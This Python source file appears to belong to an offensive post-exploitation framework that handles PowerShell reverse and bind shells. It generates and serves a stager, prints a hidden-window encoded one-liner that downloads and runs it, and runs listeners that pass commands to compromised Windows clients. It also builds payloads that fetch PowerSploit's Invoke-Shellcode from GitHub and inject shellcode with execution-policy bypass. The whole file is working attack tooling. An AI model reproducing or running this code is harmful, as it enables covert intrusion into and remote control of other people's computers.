from __future__ import unicode_literals
from main import *
from menu import *
from prompt_toolkit.contrib.completers import WordCompleter

history = prompt_toolkit.history.InMemoryHistory()

serverlist = []

def printListener():
    from listener import Server
    while True:
        bindOrReverse = raw_input(t.bold_green + '[?] (b)ind/[r]everse/(m)anual: ' + t.normal).lower()
        if bindOrReverse == 'b' or bindOrReverse == 'r' or bindOrReverse == 'm':
            break
    if bindOrReverse == 'r':
        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
        windows_powershell_stager = powershellContent % ('False', FUNCTIONS().CheckInternet(), '5555')
    if bindOrReverse == 'b':
        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
        windows_powershell_stager = powershellContent % ('True', '', '5556')

    if bindOrReverse == 'm':
        manualIP = raw_input(t.bold_green + '[?] IP Addr: ' + t.normal).lower()
        powershellContent = open('lib/powershell/stager.ps1', 'r').read()
        windows_powershell_stager = powershellContent % ('False', manualIP, '5555')

    powershellFileName = 'p.ps1'
    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
        powershellStagerFile.write(windows_powershell_stager)
        powershellStagerFile.close()
    randoStagerDLPort = random.randint(5000,9000)
    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
    print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')

    if bindOrReverse == 'b':
        if not '5556' in str(serverlist):
            ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
            connectserver = Server(ipADDR, 5556, bindsocket=False)
            serverlist.append(connectserver)
    else:
        if not '5555' in str(serverlist):
            listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
            serverlist.append(listenerserver)
    return "pass"


def interactShell(clientnumber):
    clientnumber = int(clientnumber)
    from menu import clientMenuOptions
    for server in serverlist:
        if clientnumber in server.handlers.keys():
            print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
            while True:
                if server.handlers[clientnumber].in_buffer:
                    print server.handlers[clientnumber].in_buffer.pop()
                command = prompt_toolkit.prompt("PS >", completer=WordCompleter(['back', 'exit']), history=history)
                if command.lower() == "back":
                    break
                if command.lower() == "exit":
                    server.handlers[clientnumber].handle_close()
                    del clientMenuOptions[str(clientnumber)]
                    time.sleep(2)
                    break
                if command == "":
                    server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":""}')
                else:
                    json = '{"type":"exec", "data":"%s", "sendoutput":"true"}'% ((base64.b64encode(command.encode('utf_16_le'))))
                    server.handlers[clientnumber].out_buffer.append(json)
                    while not server.handlers[clientnumber].in_buffer:
                        time.sleep(0.01)
                    print server.handlers[clientnumber].in_buffer.pop()

    return "clear"

def returnServerList():
    return serverlist

def checkPayloadLength(payload):
    maxlen = 10000
    splitPayload = []
    payloadLen = len(payload)

    if payloadLen > maxlen:
        current_length = 0
        numberOfPackets = int(payloadLen / maxlen)
        if payloadLen % maxlen != 0:
            numberOfPackets += 1
        print "number of staged packets: " + str(numberOfPackets)

        while current_length < payloadLen:
            cutlength = maxlen
            if payloadLen < current_length + maxlen:
                cutlength = payloadLen - current_length

            tmp_str = payload[current_length:current_length + cutlength]
            current_length += maxlen
            splitPayload.append(tmp_str)
    else:
        splitPayload = None

    return splitPayload


def checkUpload():
    from menu import clientMenuOptions
    use_client_upload = raw_input('[?] Upload Using Client Connection? [y]/n: ')
    if use_client_upload.lower() == 'y' or use_client_upload == '':
        for i in clientMenuOptions.keys():
            if i == 'back' or i == 'r':
                pass
            else:
                print t.bold_yellow + i + t.normal + ': ' + t.bold_green + clientMenuOptions[i]['payload']  + t.normal + '\n'
        while True:
            clientchoice = raw_input('>> ')
            try:
                return int(clientMenuOptions[clientchoice]['params'])
            except:
                continue
    return False

def clientUpload(fileToUpload, powershellExec, isExe, json):
    clientnumber = checkUpload()
    if clientnumber:
        if isExe:
            newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
            encPowershell = "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
            encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
            fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
            b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
            lenb64 = len(b64Exec)
        else:
            b64Exec = base64.b64encode(powershellExec.encode('UTF-16LE'))
            lenb64 = len(b64Exec)


        splitPayoad = checkPayloadLength(b64Exec)

        if splitPayoad:
            for p in splitPayoad:
                for server in serverlist:
                    if clientnumber in server.handlers.keys():
                        server.handlers[clientnumber].out_buffer.append(json % (p))
                        time.sleep(0.5)
            print "sending exec packet!"
            time.sleep(0.5)
            for server in serverlist:
                if clientnumber in server.handlers.keys():
                    server.handlers[clientnumber].out_buffer.append('{"type":"", "data":"", "sendoutput":"false", "multiple":"exec"}')
        else:
            for server in serverlist:
                if clientnumber in server.handlers.keys():
                    server.handlers[clientnumber].out_buffer.append(json % (b64Exec))

        return clientnumber

    else:
        return False
